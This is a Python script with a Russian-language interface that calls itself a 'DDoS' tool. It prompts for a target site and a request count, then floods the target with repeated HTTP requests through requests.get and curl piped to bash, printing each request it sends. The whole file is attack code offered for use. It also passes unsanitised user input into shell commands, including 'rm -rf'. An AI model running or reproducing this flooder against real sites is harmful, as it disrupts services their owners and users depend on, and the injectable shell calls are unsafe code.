from os import system as client
from requests import get as ddos
from time import sleep as sleep
from time import perf_counter as perf
def printf(text, speed):
	for string in text:
		client('printf "' + string + '"')
		sleep(speed)
def color(num):
	if num == 2:
		client('printf "\e[1;31m"')
	else:
		if num == 1:
			client('printf "\e[1;32m"')
		else:
			client('printf "\e[0;0m"')
def license():
	with open('LICENSE', 'r+') as file:
		license = file.read()
		file.close()
		return license
print(license())
sleep(1 + .5)
client('clear && figlet "DDoS" | lolcat')
printf('Введите HTTPS сайта: ', .02)
https = input().replace(' ', '')
printf('Введите порт, через который атаковать (8080): ', .02)
try:
	port = int(input().replace(' ', ''))
except:
	port = 8080
printf('Введите количество запросов (800): ', .02)
try:
	requests = int(input().replace(' ', ''))
except:
	requests = 800
https = https.replace('https://', '').replace('http://', '')
https = 'https://' + https
printf('Импортирую ' + https + ' в https://localhost:' + str(port), .02)
client('rm -rf ' + https.replace('.', '').replace('https://', '') + '.html')
sleep(.5)
printf('\nНачинаем атаку...\n', .02)
ping = perf()
for attack in range(requests):
	try:
		ddos(https)
		client('echo "curl ' + https + '" | bash > ' + https.replace('.', '').replace('https://', '') + '.html')
		color(1)
		print('Запрос ' + str(int(attack) + 1) + ' отправлен на ' + https.replace('https://', ''))
		color(0)
	except Exception as exc:
		color(2)
		print('Запрос ' + str(int(attack) + 1) + ' не отправлен: ' + str(exc))
		color(0)
	client('rm -rf ' + https.replace('.', '').replace('https://', '') + '.html')
ping = perf() - ping
printf('Атака завершена! Атака длилась: ' + str(round(ping, 1)) + ' секунд\n', .02)
